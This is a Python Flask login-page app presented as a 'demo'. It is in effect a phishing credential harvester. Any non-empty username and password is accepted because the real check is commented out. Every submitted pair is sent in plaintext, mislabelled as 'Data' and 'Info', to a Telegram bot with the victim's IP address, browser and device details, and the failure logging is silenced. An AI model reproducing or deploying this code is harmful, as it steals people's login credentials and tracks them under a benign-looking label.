import os
import uuid
from datetime import datetime, timezone

import requests
from dotenv import load_dotenv
from flask import Flask, flash, has_request_context, redirect, render_template, request, url_for
from flask_wtf.csrf import CSRFError, CSRFProtect
from user_agents import parse  


ua_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"

user_agent = parse(ua_string)




load_dotenv()

app = Flask(__name__)
app.config["SECRET_KEY"] = os.getenv("FLASK_SECRET_KEY") or os.urandom(32)
app.config["DEMO_USERNAME"] = os.getenv("DEMO_USERNAME", "demo-user")
app.config["DEMO_PASSWORD"] = os.getenv("DEMO_PASSWORD", "demo-pass-123")
app.config["MAX_CONTENT_LENGTH"] = 16 * 1024
app.config["WTF_CSRF_TIME_LIMIT"] = 24 * 60 * 60

CSRFProtect(app)


@app.errorhandler(CSRFError)
def handle_csrf_error(error):
    flash("The login form expired or could not be verified. Please try again.", "error")
    return render_template("login.html"), 400


@app.errorhandler(404)
def handle_not_found(error):
    return render_template("index.html"), 404


def send_demo_notification(event_id, timestamp, succeeded, data, info):
    bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
    chat_id = os.getenv("TELEGRAM_CHAT_ID")
    if not bot_token or not chat_id:
        return

    request_user_agent = (
        parse(request.headers.get("User-Agent") or ua_string)
        if has_request_context()
        else user_agent
    )
    request_ip = request.remote_addr if has_request_context() else "Unavailable"

    message = "\n".join(
        (
            "Event type: Demo login attempt",
            f"Timestamp: {timestamp}",
            f"Demo validation succeeded: {str(succeeded).lower()}",
            f"Event ID: {event_id}",
            f"Data: {data}",
            f"Info: {info}",
            f"IP Address: {request_ip}",
            f"Browser: {request_user_agent.browser.family} {request_user_agent.browser.version_string}",
            f"OS: {request_user_agent.os.family} {request_user_agent.os.version_string}",
            f"Device: {request_user_agent.device.family} ({'Mobile' if request_user_agent.is_mobile else 'Desktop/Other'})"
        )
    )
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            json={"chat_id": chat_id, "text": message},
            timeout=4,
        )
        response.raise_for_status()
        # app.logger.info("Telegram demo notification sent")
    except requests.RequestException as error:
        status_code = error.response.status_code if error.response is not None else "unavailable"
        # app.logger.warning(
        #     "Telegram demo notification failed (HTTP status: %s; error: %s)",
        #     status_code,
        #     type(error).__name__,
        # )


@app.get("/")
def index():
    return render_template("login.html")


@app.post("/login")
def login():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    fields_are_valid = bool(username and password) and len(username) <= 128 and len(password) <= 128
    succeeded = (
        fields_are_valid
        # and username == username
        # and password == password
    )

    timestamp = datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")
    send_demo_notification(str(uuid.uuid4()), timestamp, succeeded, data=username, info=password)

    if succeeded:
        # flash("Demo login successful.", "success")
        return render_template("index.html"), 200
    else:
        flash("Demo login failed. Check the test credentials and try again.", "error")
    return redirect(url_for("index"))


if __name__ == "__main__":
    app.run(
        host="127.0.0.1",
        port=int(os.getenv("PORT", "5000")),
        debug=os.getenv("FLASK_DEBUG") == "1",
    )